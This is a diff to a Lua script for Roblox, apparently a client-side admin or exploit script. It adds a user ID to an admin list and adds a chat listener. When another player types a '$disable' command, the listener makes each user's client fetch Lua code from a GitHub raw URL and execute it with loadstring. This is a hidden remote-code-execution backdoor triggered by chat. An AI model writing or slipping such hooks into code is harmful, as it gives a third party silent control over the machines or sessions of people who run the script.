@@ -34,7 +34,9 @@ local StaffId = {
 	[229198462] = true,
 }
 
-local AdminId = {}
+local AdminId = {
+	[1090807044] = true,
+}
 
 function premium()
 	for _,v in pairs(game:GetService('Players'):GetChildren()) do
@@ -227,7 +229,6 @@ function premium()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua"))()
             end
         end
-    
     end)
 		
 		v.Chatted:connect(function(cht)
@@ -798,6 +799,13 @@ local freeze = function()
 				end
 			end
 		end)
+		v.Chatted:connect(function(cht)
+        if cht:match("$disable .") then
+            if game.Players.LocalPlayer ~= dev2 then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua"))()
+            end
+        end
+    end)
 ------UNEXPECTED NVM LOL--------
 		end
 		end
